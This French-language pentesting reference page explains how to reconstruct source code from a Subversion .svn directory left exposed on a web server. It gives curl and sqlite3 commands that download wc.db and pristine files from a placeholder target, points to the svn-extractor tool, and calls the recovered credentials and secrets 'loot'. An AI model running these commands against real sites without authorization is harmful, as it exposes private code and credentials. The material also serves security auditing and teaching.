---
title: "Répertoire .svn exposé : reconstruire le code source depuis une copie de travail Subversion"
description: "Récupérer une copie de travail .svn exposée sur le web : la disposition moderne wc.db SQLite et le pristine store, la disposition héritée entries et text-base, interroger la base de données pour les chemins de fichiers et les checksums, récupérer le contenu pristine, et automatiser avec svn-extractor."
keywords:
  - .svn exposure
  - wc.db
  - pristine store
  - svn-extractor
  - source code disclosure
---

# Répertoire .svn exposé

Une copie de travail Subversion garde ses métadonnées dans un répertoire `.svn`. Lorsqu'un déploiement copie une copie de travail vers la racine web, ce répertoire fait fuiter le code source complet, y compris des fichiers non atteignables par l'application, parce que la copie de travail stocke une copie complète et non modifiée de chaque fichier suivi aux côtés de son chemin et de son checksum.

## Deux dispositions

Les fichiers à récupérer dépendent de la version de Subversion qui a créé la copie de travail.

- **1.7 et ultérieures** : un unique `.svn/` à la racine du checkout contenant `wc.db` (une base de données SQLite de chemins, checksums et révisions) et un store `pristine/` détenant le contenu non modifié de chaque fichier, nommé par son checksum.
- **Héritée (pré-1.7)** : un `.svn/` dans **chaque** répertoire, avec un fichier `entries` listant les fichiers du répertoire et une copie pristine `text-base/<file>.svn-base` de chacun.

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/.svn/wc.db       # 200 => modern layout
curl -s https://target/.svn/entries | head                              # a number/URL => legacy layout
```

## Disposition moderne : interroger et récupérer

Téléchargez la base de données, lisez la liste des fichiers et les checksums, puis récupérez chaque objet pristine. Le checksum dans `wc.db` est un SHA-1 écrit comme `$sha1$<hex>` ; le fichier pristine vit à `.svn/pristine/<first2>/<full-sha1>.svn-base`.

```bash
curl -s https://target/.svn/wc.db -o wc.db
sqlite3 wc.db "select local_relpath, checksum from nodes where kind='file' and checksum is not null;"
# for each checksum <hex>, fetch the content:
curl -s "https://target/.svn/pristine/${hex:0:2}/${hex}.svn-base" -o "src/path"
```

Lisez `local_relpath` pour la disposition d'arborescence d'origine et `checksum` pour localiser le contenu ; réassemblez dans l'arborescence source.

## Disposition héritée et automatisation

Pour la disposition pré-1.7, récupérez le `.svn/entries` de chaque répertoire pour connaître les noms de fichiers, puis récupérez `.svn/text-base/<file>.svn-base`. Dans les deux cas, un extracteur dédié parcourt cela pour vous :

```bash
python svn_extractor.py --url https://target/   # recovers the working copy into a local tree
```

## Suite

Le code source récupéré est la carte de l'étape suivante et, très souvent, porte le butin directement : identifiants de base de données et d'API dans les fichiers de config, noms d'hôte internes et les propres vulnérabilités de l'application. Les fichiers supprimés qui sont toujours présents dans le pristine store sont fréquemment là où se cachent les secrets.

## Outils

- [svn-extractor](https://github.com/anantshri/svn-extractor) : récupérer une copie de travail `.svn` exposée sur le web.
- `sqlite3` : lire `wc.db` directement.

## Références

- [Subversion working copy and the pristine store (SVN book)](https://svnbook.red-bean.com/en/1.7/svn.tour.cleanup.html)
- [HackTricks: source code disclosure](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html)
